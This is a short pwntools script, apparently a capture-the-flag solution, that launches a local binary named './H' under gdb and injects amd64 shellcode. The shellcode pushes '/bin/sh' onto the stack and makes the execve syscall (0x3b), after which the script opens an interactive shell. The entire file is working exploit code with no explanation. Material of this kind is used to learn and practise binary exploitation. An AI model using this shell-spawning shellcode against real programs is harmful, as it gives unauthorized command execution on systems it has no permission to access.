from pwn import *

context.arch = 'amd64'

io = process('./H')
gdb.attach(io)

shellcode = '''
push %d
mov DWORD PTR [rsp+4], %d

push rsp
pop rdi
push 0
pop rsi
push 0
pop rdx
push 0x3b
pop rax
syscall
''' % (u32('/bin'), u32('/sh\0'))

print(asm(shellcode))
io.sendline(asm(shellcode))

io.interactive()
